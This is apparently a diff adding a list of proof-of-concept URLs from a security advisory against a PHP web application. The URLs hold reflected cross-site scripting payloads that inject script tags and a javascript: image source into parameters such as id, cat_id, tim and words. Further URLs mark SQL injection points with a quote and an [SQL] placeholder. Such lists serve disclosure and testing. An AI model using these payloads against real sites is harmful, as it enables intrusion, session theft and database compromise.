@@ -1,0 +1,13 @@
+http://www.example.com/?words=%3Cscript%3Ealert(/Ellipsis%20Security%20Test/)%3C/script%3E&amp;where=1
+http://www.example.com/index.php?id=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?cat_id=&#039;%3E%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?cat_id=Business&amp;tim=%22%3E%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?tim=%22%3E%3Cscript%3Ealert(&#039;Ellipsis%20Security%20Test&#039;)%3C/script%3E
+http://www.example.com/index.php?id=%3Cimg%20src=javascript:alert(%22EllipsisSecuritTest%22)%3E
+http://www.example.com/?words=&#039;[SQL]
+http://www.example.com/?words=%27[SQL]&amp;where=1
+http://www.example.com/index.php?id=&#039;[SQL]
+http://www.example.com/index.php?topmenuitem=&#039;[SQL]
+http://www.example.com/index.php?cat_id=&#039;[SQL]
+http://www.example.com/index.php?words=&#039;[SQL]&amp;where=1
+http://www.example.com/inc/rss_feed.php?category=&#039;[SQL]&amp;amount=10
